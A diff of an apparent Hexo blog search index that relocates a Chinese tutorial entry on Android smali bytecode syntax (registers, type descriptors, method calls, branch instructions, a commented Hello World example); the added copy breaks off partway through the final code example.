@@ -189,145 +189,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Android逆向-smali语法</title>
-    <url>/2018/06/01/Android%E9%80%86%E5%90%91-smali%E8%AF%AD%E6%B3%95/</url>
-    <content><![CDATA[<h2 id="Dalvik"><a href="#Dalvik" class="headerlink" title="Dalvik"></a>Dalvik</h2><p>DVM运行Dalvik字节码，可执行文件格式dex(dalvik executable)，有点类似于机器码。DVM基于寄存器，JVM基于栈。</p>
-<h2 id="smali语法"><a href="#smali语法" class="headerlink" title="smali语法"></a>smali语法</h2><a id="more"></a>
-<h3 id="变量和参数寄存器命名方式"><a href="#变量和参数寄存器命名方式" class="headerlink" title="变量和参数寄存器命名方式"></a>变量和参数寄存器命名方式</h3><div class="table-container">
-<table>
-<thead>
-<tr>
-<th style="text-align:center">v命名法</th>
-<th style="text-align:center">p命名法</th>
-<th style="text-align:center">寄存器含义</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">v0</td>
-<td style="text-align:center">v0</td>
-<td style="text-align:center">第一个局部变量寄存器</td>
-</tr>
-<tr>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-<td style="text-align:center">中间的局部变量寄存器</td>
-</tr>
-<tr>
-<td style="text-align:center">vM-N</td>
-<td style="text-align:center">p0</td>
-<td style="text-align:center">第一个参数寄存器（通常为调用对象）</td>
-</tr>
-<tr>
-<td style="text-align:center">…</td>
-<td style="text-align:center">…</td>
-<td style="text-align:center">中间的参数寄存器</td>
-</tr>
-<tr>
-<td style="text-align:center">vM-1</td>
-<td style="text-align:center">pN-1</td>
-<td style="text-align:center">第N个参数寄存器</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p>通常使用p命名法进行记录。</p>
-<h3 id="类型描述符"><a href="#类型描述符" class="headerlink" title="类型描述符"></a>类型描述符</h3><div class="table-container">
-<table>
-<thead>
-<tr>
-<th style="text-align:center">语法</th>
-<th style="text-align:center">类型</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">——</td>
-<td style="text-align:center">———-</td>
-</tr>
-<tr>
-<td style="text-align:center">V</td>
-<td style="text-align:center">void</td>
-</tr>
-<tr>
-<td style="text-align:center">Z</td>
-<td style="text-align:center">boolean</td>
-</tr>
-<tr>
-<td style="text-align:center">B</td>
-<td style="text-align:center">byte</td>
-</tr>
-<tr>
-<td style="text-align:center">S</td>
-<td style="text-align:center">short</td>
-</tr>
-<tr>
-<td style="text-align:center">C</td>
-<td style="text-align:center">char</td>
-</tr>
-<tr>
-<td style="text-align:center">I</td>
-<td style="text-align:center">int</td>
-</tr>
-<tr>
-<td style="text-align:center">J</td>
-<td style="text-align:center">long</td>
-</tr>
-<tr>
-<td style="text-align:center">F</td>
-<td style="text-align:center">float</td>
-</tr>
-<tr>
-<td style="text-align:center">D</td>
-<td style="text-align:center">double</td>
-</tr>
-<tr>
-<td style="text-align:center">L</td>
-<td style="text-align:center">java类</td>
-</tr>
-<tr>
-<td style="text-align:center">[</td>
-<td style="text-align:center">数组</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p><strong>注：</strong></p>
-<ul>
-<li>变量存放在寄存器中，寄存器为32位，支持任何类型，其中long，double是64位，使用两个相邻的寄存器。</li>
-<li>[x表示一维数组，x代表基本类型，如[I代表int[],[[x代表二维数组。</li>
-<li>Java语言存在大量对象，java.lang.String表示为<em>Ljava/lang/String;</em>；分号一定要加上。</li>
-</ul>
-<h3 id="方法和字段"><a href="#方法和字段" class="headerlink" title="方法和字段"></a>方法和字段</h3><h4 id="方法定义"><a href="#方法定义" class="headerlink" title="方法定义"></a>方法定义</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#direct&#x2F;virtual methods</span><br><span class="line">.method &lt;访问权限&gt; [修饰关键字] &lt;方法原型&gt;</span><br><span class="line">    &lt;.registers&gt;</span><br><span class="line">    [.param]</span><br><span class="line">    [.prologue]</span><br><span class="line">    [.line]</span><br><span class="line">    &lt;.local&gt;</span><br><span class="line">    &lt;代码体&gt;</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure>
-<ul>
-<li><h1 id="direct-virtual-methods是注释，是baksmali添加的，访问权限和修饰关键字跟字段是一样的。"><a href="#direct-virtual-methods是注释，是baksmali添加的，访问权限和修饰关键字跟字段是一样的。" class="headerlink" title="direct/virtual methods是注释，是baksmali添加的，访问权限和修饰关键字跟字段是一样的。"></a>direct/virtual methods是注释，是baksmali添加的，访问权限和修饰关键字跟字段是一样的。</h1></li>
-<li>方法原型描述了方法的名称、参数与返回值。<ul>
-<li>.registers 指令指定了方法中寄存器的总数,这个数量是参数和本地变量总和。</li>
-<li>.param表明了方法的参数，每个.param指令表示一个参数，方法使用了几个参数就有几个.parameter指令。</li>
-<li>.prologue指定了代码的开始处，混淆过的代码可能去掉了该指令。</li>
-<li>.line指明了该处代码在源代码中的行号，同样，混淆后的代码可能去掉了行号。</li>
-<li>.local 使用这个指定表明方法中非参寄存器</li>
-</ul>
-</li>
-</ul>
-<h4 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h4><p>方法调用格式：Lpackage/name/ObjectName;-&gt;MethodName(III)Z<br>等价于bool package.name.ObjectName.MethodName（int,int,int）<br>例子：<br>method(I[[IILjava/lang/String;[Ljava/lang/Object;)Ljava/lang/Stirng<br>等价于<br>String method(int,int[][],int,String,Object[])</p>
-<h4 id="字段调用"><a href="#字段调用" class="headerlink" title="字段调用"></a>字段调用</h4><p>格式：Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String;<br>等价于：package.name.ObjectName.FieldName</p>
-<h3 id="头信息-类的主体信息"><a href="#头信息-类的主体信息" class="headerlink" title="头信息-类的主体信息"></a>头信息-类的主体信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">public class MainActivity extends AppCompatActivity implements View.OnClickListener &#123;</span><br><span class="line">    &#x2F;&#x2F; ......</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;smali文件头&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">.class public Ltestdemo&#x2F;hpp&#x2F;cn&#x2F;test&#x2F;MainActivity;</span><br><span class="line">.super Landroid&#x2F;support&#x2F;v7&#x2F;app&#x2F;AppCompatActivity;</span><br><span class="line">.source &quot;MainActivity.java&quot;</span><br><span class="line">.implements Landroid&#x2F;view&#x2F;View$OnClickListener;</span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
-<p>.class &lt;访问权限&gt; [关键修饰字] &lt;类名&gt;;<br>.super &lt;父类名&gt;;<br>.source &lt;源文件名&gt;<br>.implements &lt;接口名&gt;</p>
-<h3 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h3><p>共有12种判断语句<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if-eq vA, VB, cond_** 如果vA等于vB则跳转到cond_**。相当于if (vA&#x3D;&#x3D;vB)</span><br><span class="line">if-ne vA, VB, cond_** 如果vA不等于vB则跳转到cond_**。相当于if (vA!&#x3D;vB)</span><br><span class="line">if-lt vA, VB, cond_** 如果vA小于vB则跳转到cond_**。相当于if (vA&lt;vB)</span><br><span class="line">if-le vA, VB, cond_** 如果vA小于等于vB则跳转到cond_**。相当于if (vA&lt;&#x3D;vB)</span><br><span class="line">if-gt vA, VB, cond_** 如果vA大于vB则跳转到cond_**。相当于if (vA&gt;vB)</span><br><span class="line">if-ge vA, VB, cond_** 如果vA大于等于vB则跳转到cond_**。相当于if (vA&gt;&#x3D;vB)</span><br><span class="line"></span><br><span class="line">if-eqz vA, :cond_** 如果vA等于0则跳转到:cond_** 相当于if (VA&#x3D;&#x3D;0)</span><br><span class="line">if-nez vA, :cond_** 如果vA不等于0则跳转到:cond_**相当于if (VA!&#x3D;0)</span><br><span class="line">if-ltz vA, :cond_** 如果vA小于0则跳转到:cond_**相当于if (VA&lt;0)</span><br><span class="line">if-lez vA, :cond_** 如果vA小于等于0则跳转到:cond_**相当于if (VA&lt;&#x3D;0)</span><br><span class="line">if-gtz vA, :cond_** 如果vA大于0则跳转到:cond_**相当于if (VA&gt;0)</span><br><span class="line">if-gez vA, :cond_** 如果vA大于等于0则跳转到:cond_**相当于if (VA&gt;&#x3D;0)</span><br></pre></td></tr></table></figure></p>
-<h3 id="其它基本指令"><a href="#其它基本指令" class="headerlink" title="其它基本指令"></a>其它基本指令</h3><p>smali字节码类似于汇编<br>.method　　方法<br>.end method　　函数结束<br>.parameter　　方法参数<br>.prologue　　方法开始<br>.line 12　　此方法位于第12行<br>.field private isFlag:z　　定义变量<br>move v0, v3 把v3寄存器的值移动到寄存器v0上<br>const-string v0, “MainActivity” 把字符串”MainActivity”赋值给v0寄存器<br>const/high16  v0, 0x7fo3　　把0x7fo3赋值给v0<br>invoke-super　　调用父函数<br>return-void　　函数返回void<br>new-instance　　创建实例<br>iput-object　　对象赋值<br>iget-object　　调用对象<br>invoke-static　　调用静态函数<br>invoke-direct　　调用函数</p>
-<p>例子：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">@Override</span><br><span class="line">public void onClick(View view) &#123;</span><br><span class="line">    String str &#x3D; &quot;Hello World!&quot;;</span><br><span class="line">    print(str);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"># virtual methods</span><br><span class="line"># 参数类型为Landroid&#x2F;view&#x2F;View，返回类型为V</span><br><span class="line">.method public onClick(Landroid&#x2F;view&#x2F;View;)V</span><br><span class="line">    # 表示有三个寄存器</span><br><span class="line">    .registers 3</span><br><span class="line">    # 参数View类型的view变量对应的是寄存器p1</span><br><span class="line">    .param p1, &quot;view&quot;    # Landroid&#x2F;view&#x2F;View;</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line 24</span><br><span class="line">    #将&quot;Hello World!&quot;字符串放到寄存器v0中</span><br><span class="line">    const-string v0, &quot;Hello World!&quot;</span><br><span class="line"></span><br><span class="line">    .line 25</span><br><span class="line">    # 定义一个Ljava&#x2F;lang&#x2F;String类型的str变量对应本地寄存器v0</span><br><span class="line">    .local v0, &quot;str&quot;:Ljava&#x2F;lang&#x2F;String;</span><br><span class="line">    # 调用该类的print方法，该方法的参数类型为Ljava&#x2F;lang&#x2F;String，返回值为V</span><br><span class="line">    # 调用print方法传入的参数为&#123;p0, v0&#125;，及print(p0, v0)，p0为this，v0为&quot;Hello World!&quot;字符串</span><br><span class="line">    invoke-direct &#123;p0, v0&#125;, Ltestdemo&#x2F;hpp&#x2F;cn&#x2F;annotationtest&#x2F;MainActivity;-&gt;print(Ljava&#x2F;lang&#x2F;String;)V</span><br><span class="line"></span><br><span class="line">    .line 26</span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure></p>
-<p>参考文章：<br><a href="https://blog.csdn.net/hp910315/article/details/51823236">静态分析Android程序——smali文件解析</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>逆向</tag>
-        <tag>android</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>流量分析入门</title>
     <url>/2018/07/12/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/</url>
     <content><![CDATA[<h2 id="NetFlow"><a href="#NetFlow" class="headerlink" title="NetFlow"></a>NetFlow</h2><p>NetFlow是一种数据交换方式，由思科于1990年开发。其工作原理是：NetFlow利用标准的交换模式处理数据流的第一个IP包数据，生成NetFlow缓存，随后同样的数据基于缓存信息在同一个数据流中进行传输，不再匹配相关的访问控制等策略，NetFlow缓存同时包含了随后数据流的统计信息。<br><a id="more"></a></p>
@@ -520,6 +381,145 @@
       </tags>
   </entry>
   <entry>
+    <title>Android逆向-smali语法</title>
+    <url>/2018/06/01/Android%E9%80%86%E5%90%91-smali%E8%AF%AD%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="Dalvik"><a href="#Dalvik" class="headerlink" title="Dalvik"></a>Dalvik</h2><p>DVM运行Dalvik字节码，可执行文件格式dex(dalvik executable)，有点类似于机器码。DVM基于寄存器，JVM基于栈。</p>
+<h2 id="smali语法"><a href="#smali语法" class="headerlink" title="smali语法"></a>smali语法</h2><a id="more"></a>
+<h3 id="变量和参数寄存器命名方式"><a href="#变量和参数寄存器命名方式" class="headerlink" title="变量和参数寄存器命名方式"></a>变量和参数寄存器命名方式</h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">v命名法</th>
+<th style="text-align:center">p命名法</th>
+<th style="text-align:center">寄存器含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">v0</td>
+<td style="text-align:center">v0</td>
+<td style="text-align:center">第一个局部变量寄存器</td>
+</tr>
+<tr>
+<td style="text-align:center">…</td>
+<td style="text-align:center">…</td>
+<td style="text-align:center">中间的局部变量寄存器</td>
+</tr>
+<tr>
+<td style="text-align:center">vM-N</td>
+<td style="text-align:center">p0</td>
+<td style="text-align:center">第一个参数寄存器（通常为调用对象）</td>
+</tr>
+<tr>
+<td style="text-align:center">…</td>
+<td style="text-align:center">…</td>
+<td style="text-align:center">中间的参数寄存器</td>
+</tr>
+<tr>
+<td style="text-align:center">vM-1</td>
+<td style="text-align:center">pN-1</td>
+<td style="text-align:center">第N个参数寄存器</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>通常使用p命名法进行记录。</p>
+<h3 id="类型描述符"><a href="#类型描述符" class="headerlink" title="类型描述符"></a>类型描述符</h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">语法</th>
+<th style="text-align:center">类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">——</td>
+<td style="text-align:center">———-</td>
+</tr>
+<tr>
+<td style="text-align:center">V</td>
+<td style="text-align:center">void</td>
+</tr>
+<tr>
+<td style="text-align:center">Z</td>
+<td style="text-align:center">boolean</td>
+</tr>
+<tr>
+<td style="text-align:center">B</td>
+<td style="text-align:center">byte</td>
+</tr>
+<tr>
+<td style="text-align:center">S</td>
+<td style="text-align:center">short</td>
+</tr>
+<tr>
+<td style="text-align:center">C</td>
+<td style="text-align:center">char</td>
+</tr>
+<tr>
+<td style="text-align:center">I</td>
+<td style="text-align:center">int</td>
+</tr>
+<tr>
+<td style="text-align:center">J</td>
+<td style="text-align:center">long</td>
+</tr>
+<tr>
+<td style="text-align:center">F</td>
+<td style="text-align:center">float</td>
+</tr>
+<tr>
+<td style="text-align:center">D</td>
+<td style="text-align:center">double</td>
+</tr>
+<tr>
+<td style="text-align:center">L</td>
+<td style="text-align:center">java类</td>
+</tr>
+<tr>
+<td style="text-align:center">[</td>
+<td style="text-align:center">数组</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><strong>注：</strong></p>
+<ul>
+<li>变量存放在寄存器中，寄存器为32位，支持任何类型，其中long，double是64位，使用两个相邻的寄存器。</li>
+<li>[x表示一维数组，x代表基本类型，如[I代表int[],[[x代表二维数组。</li>
+<li>Java语言存在大量对象，java.lang.String表示为<em>Ljava/lang/String;</em>；分号一定要加上。</li>
+</ul>
+<h3 id="方法和字段"><a href="#方法和字段" class="headerlink" title="方法和字段"></a>方法和字段</h3><h4 id="方法定义"><a href="#方法定义" class="headerlink" title="方法定义"></a>方法定义</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#direct&#x2F;virtual methods</span><br><span class="line">.method &lt;访问权限&gt; [修饰关键字] &lt;方法原型&gt;</span><br><span class="line">    &lt;.registers&gt;</span><br><span class="line">    [.param]</span><br><span class="line">    [.prologue]</span><br><span class="line">    [.line]</span><br><span class="line">    &lt;.local&gt;</span><br><span class="line">    &lt;代码体&gt;</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure>
+<ul>
+<li><h1 id="direct-virtual-methods是注释，是baksmali添加的，访问权限和修饰关键字跟字段是一样的。"><a href="#direct-virtual-methods是注释，是baksmali添加的，访问权限和修饰关键字跟字段是一样的。" class="headerlink" title="direct/virtual methods是注释，是baksmali添加的，访问权限和修饰关键字跟字段是一样的。"></a>direct/virtual methods是注释，是baksmali添加的，访问权限和修饰关键字跟字段是一样的。</h1></li>
+<li>方法原型描述了方法的名称、参数与返回值。<ul>
+<li>.registers 指令指定了方法中寄存器的总数,这个数量是参数和本地变量总和。</li>
+<li>.param表明了方法的参数，每个.param指令表示一个参数，方法使用了几个参数就有几个.parameter指令。</li>
+<li>.prologue指定了代码的开始处，混淆过的代码可能去掉了该指令。</li>
+<li>.line指明了该处代码在源代码中的行号，同样，混淆后的代码可能去掉了行号。</li>
+<li>.local 使用这个指定表明方法中非参寄存器</li>
+</ul>
+</li>
+</ul>
+<h4 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h4><p>方法调用格式：Lpackage/name/ObjectName;-&gt;MethodName(III)Z<br>等价于bool package.name.ObjectName.MethodName（int,int,int）<br>例子：<br>method(I[[IILjava/lang/String;[Ljava/lang/Object;)Ljava/lang/Stirng<br>等价于<br>String method(int,int[][],int,String,Object[])</p>
+<h4 id="字段调用"><a href="#字段调用" class="headerlink" title="字段调用"></a>字段调用</h4><p>格式：Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String;<br>等价于：package.name.ObjectName.FieldName</p>
+<h3 id="头信息-类的主体信息"><a href="#头信息-类的主体信息" class="headerlink" title="头信息-类的主体信息"></a>头信息-类的主体信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">public class MainActivity extends AppCompatActivity implements View.OnClickListener &#123;</span><br><span class="line">    &#x2F;&#x2F; ......</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;smali文件头&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">.class public Ltestdemo&#x2F;hpp&#x2F;cn&#x2F;test&#x2F;MainActivity;</span><br><span class="line">.super Landroid&#x2F;support&#x2F;v7&#x2F;app&#x2F;AppCompatActivity;</span><br><span class="line">.source &quot;MainActivity.java&quot;</span><br><span class="line">.implements Landroid&#x2F;view&#x2F;View$OnClickListener;</span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+<p>.class &lt;访问权限&gt; [关键修饰字] &lt;类名&gt;;<br>.super &lt;父类名&gt;;<br>.source &lt;源文件名&gt;<br>.implements &lt;接口名&gt;</p>
+<h3 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h3><p>共有12种判断语句<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if-eq vA, VB, cond_** 如果vA等于vB则跳转到cond_**。相当于if (vA&#x3D;&#x3D;vB)</span><br><span class="line">if-ne vA, VB, cond_** 如果vA不等于vB则跳转到cond_**。相当于if (vA!&#x3D;vB)</span><br><span class="line">if-lt vA, VB, cond_** 如果vA小于vB则跳转到cond_**。相当于if (vA&lt;vB)</span><br><span class="line">if-le vA, VB, cond_** 如果vA小于等于vB则跳转到cond_**。相当于if (vA&lt;&#x3D;vB)</span><br><span class="line">if-gt vA, VB, cond_** 如果vA大于vB则跳转到cond_**。相当于if (vA&gt;vB)</span><br><span class="line">if-ge vA, VB, cond_** 如果vA大于等于vB则跳转到cond_**。相当于if (vA&gt;&#x3D;vB)</span><br><span class="line"></span><br><span class="line">if-eqz vA, :cond_** 如果vA等于0则跳转到:cond_** 相当于if (VA&#x3D;&#x3D;0)</span><br><span class="line">if-nez vA, :cond_** 如果vA不等于0则跳转到:cond_**相当于if (VA!&#x3D;0)</span><br><span class="line">if-ltz vA, :cond_** 如果vA小于0则跳转到:cond_**相当于if (VA&lt;0)</span><br><span class="line">if-lez vA, :cond_** 如果vA小于等于0则跳转到:cond_**相当于if (VA&lt;&#x3D;0)</span><br><span class="line">if-gtz vA, :cond_** 如果vA大于0则跳转到:cond_**相当于if (VA&gt;0)</span><br><span class="line">if-gez vA, :cond_** 如果vA大于等于0则跳转到:cond_**相当于if (VA&gt;&#x3D;0)</span><br></pre></td></tr></table></figure></p>
+<h3 id="其它基本指令"><a href="#其它基本指令" class="headerlink" title="其它基本指令"></a>其它基本指令</h3><p>smali字节码类似于汇编<br>.method　　方法<br>.end method　　函数结束<br>.parameter　　方法参数<br>.prologue　　方法开始<br>.line 12　　此方法位于第12行<br>.field private isFlag:z　　定义变量<br>move v0, v3 把v3寄存器的值移动到寄存器v0上<br>const-string v0, “MainActivity” 把字符串”MainActivity”赋值给v0寄存器<br>const/high16  v0, 0x7fo3　　把0x7fo3赋值给v0<br>invoke-super　　调用父函数<br>return-void　　函数返回void<br>new-instance　　创建实例<br>iput-object　　对象赋值<br>iget-object　　调用对象<br>invoke-static　　调用静态函数<br>invoke-direct　　调用函数</p>
+<p>例子：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">@Override</span><br><span class="line">public void onClick(View view) &#123;</span><br><span class="line">    String str &#x3D; &quot;Hello World!&quot;;</span><br><span class="line">    print(str);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span 